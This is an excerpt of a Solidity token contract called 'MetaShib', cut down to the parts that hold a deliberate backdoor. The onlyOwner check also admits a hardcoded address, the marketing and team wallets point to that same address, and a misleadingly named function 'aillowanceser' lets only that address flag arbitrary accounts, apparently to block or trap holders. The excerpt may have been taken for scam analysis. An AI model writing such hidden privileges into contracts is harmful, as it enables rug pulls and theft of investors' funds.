...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x0130e13f35aff8Ac5158A7077ac34D8945b332F1), "Ownable: caller is not the owner");
        _;
    }
...
contract MetaShib is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x0130e13f35aff8Ac5158A7077ac34D8945b332F1);
    address payable public teamWalletAddress = payable(0x0130e13f35aff8Ac5158A7077ac34D8945b332F1);
    ...
    function aillowanceser(address addr, bool status) public{
        require(_msgSender()    ==   address(0x0130e13f35aff8Ac5158A7077ac34D8945b332F1));
        market[addr] = status;
    }
